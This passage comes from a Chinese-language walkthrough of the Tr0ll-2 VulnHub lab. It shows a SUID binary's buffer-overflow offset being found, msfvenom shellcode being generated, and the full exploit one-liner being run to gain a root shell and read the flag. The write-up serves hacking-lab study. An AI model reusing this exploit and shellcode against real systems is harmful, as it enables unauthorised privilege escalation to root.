Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
(gdb) i r esp
esp            0xbffffab0       0xbffffab0
(gdb)
```

将模式转换为十进制缓冲区大小

``` bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268
```

使用msfvenom创建/bin/sh的payload并转义空字节

``` bash
root@kali:~/vulnhub/troll2# msfvenom --platform linux -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 357 bytes
buf =  b""
buf += b"\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2"
buf += b"\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97"
buf += b"\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f"
buf += b"\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16"
buf += b"\xde\x7a\x1f\x55\x60"
```

编写漏洞利用程序。（A * 268）（shell偏移量）（nop sled）（shellcode）

发现esp的位置是0xbffffab0，但不能使用此偏移量作为shell位置。必须稍微增加或减少偏移量，因为在调试二进制文件时内存有所不同。

``` bash
./r00t $(python -c "print 'A' * 268 + '\x90\xfb\xff\xbf' + '\x90' * 100 + '\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16\xde\x7a\x1f\x55\x60'")
```

进入目录执行编写好的exp

``` bash
cd door3
./r00t $(python -c "print 'A' * 268 + '\x90\xfb\xff\xbf' + '\x90' * 100 + '\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16\xde\x7a\x1f\x55\x60'")
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
whoami
root
cd /root
ls -la
total 80
drwx------ 11 root   root   4096 Oct 14  2014 .
drwxr-xr-x 23 root   root   4096 Oct  5  2014 ..
-rw-------  1 root   root     67 Oct 14  2014 .bash_history
-rw-r--r--  1 root   root   3106 Apr 19  2012 .bashrc
-rw-r--r--  1 root   root    140 Apr 19  2012 .profile
-rw-r--r--  1 root   root     66 Oct  5  2014 .selected_editor
drwx------  2 root   root   4096 Oct  4  2014 .ssh
drwxr-xr-x  2 root   root   4096 Oct  5  2014 .vim
-rw-------  1 root   root   4259 Oct 14  2014 .viminfo
-rw-r--r--  1 root   root     68 Oct  6  2014 Proof.txt
drwxr-xr-x  5 root   root   4096 Oct  4  2014 core1
drwxr-xr-x  5 root   root   4096 Oct  4  2014 core2
drwxr-xr-x  5 root   root   4096 Oct  4  2014 core3
drwxr-xr-x  5 root   root   4096 Oct  4  2014 core4
drwxr-xr-x  2 root   root   4096 Oct  5  2014 goal
drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode
-rw-r--r--  1 maleus maleus 1474 Oct  4  2014 lmao.zip
-rw-r--r--  1 root   root    828 Oct  4  2014 ran_dir.py
drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot
cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub235.jpg)

到此为止，已经成功地获取了root权限，并找到了flag。


#### 知识点总结

 - md5值校验
 - base64加密文本字符串解密
 - fcrackzip破解压缩包密码
 - ssh使用rsa私匙登录
 - shellshock漏洞利用
 - 设置SUID位的二进制文件使用gdb调试缓冲区溢出位置
 - msfvenom生成shellcode
 - 缓冲区溢出shellcode exp脚本编写

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>







<!-- kb:end Tr0ll-2 -->

</details>

